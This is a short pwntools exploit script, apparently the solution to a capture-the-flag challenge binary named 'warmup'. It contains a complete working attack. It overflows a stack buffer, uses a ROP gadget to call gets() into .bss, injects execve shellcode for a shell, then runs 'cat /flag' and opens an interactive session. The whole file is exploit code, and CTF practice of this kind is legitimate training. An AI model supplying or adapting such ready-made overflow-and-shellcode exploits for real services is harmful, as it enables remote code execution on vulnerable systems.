#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./warmup"

rhp = {"host":"localhost","port":12301}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
bsssec = binf.bss()

rdi_gadget = 0x00400773

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

def exploit(conn):
  
  payload = "A"*(0x100+0x8)
  payload += p64(rdi_gadget)
  payload += p64(binf.bss())
  payload += p64(binf.plt["gets"])
  payload += p64(binf.bss())

  conn.recvuntil(":)\n")
  conn.sendline(payload)
  conn.sendline(shellcode)

  conn.sendline("cat /flag")

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

